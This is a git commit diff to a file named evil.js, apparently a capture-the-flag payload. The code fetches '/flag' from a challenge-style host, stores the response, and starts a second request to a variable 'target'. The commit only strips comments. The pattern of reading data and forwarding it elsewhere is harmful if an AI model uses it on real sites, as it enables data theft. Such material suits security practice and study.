4c539fa528c8735a9691fcd01ee591f626404ee1
LeCrepuscule <143530654+tac-eL@users.noreply.github.com>
2024-10-29 09:38:25 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -7,14 +7,13 @@ fetch('http://0192d5de50dd7dfeb24785eecc33bd0b.uy3t.dg02.ciihw.cn:44940/flag', {
     method: 'GET',
 })
 .then(response => {
-    // 确保响应是成功的
     if (!response.ok) {
         throw new Error('Network response was not ok');
     }
     return response.json();
 })
 .then(data => {
-    responseData = data; // 将响应数据存储在变量中
+    responseData = data;
 })
 
 fetch(target, {
